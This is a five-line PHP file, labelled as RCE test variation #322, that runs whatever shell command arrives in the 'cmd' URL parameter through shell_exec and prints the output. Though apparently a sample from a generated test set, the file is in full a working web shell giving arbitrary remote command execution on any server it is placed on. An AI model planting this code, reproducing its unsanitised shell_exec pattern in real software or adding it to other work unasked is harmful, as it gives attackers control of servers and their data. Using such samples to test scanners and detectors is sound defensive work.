<?php
// RCE test variation #322
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>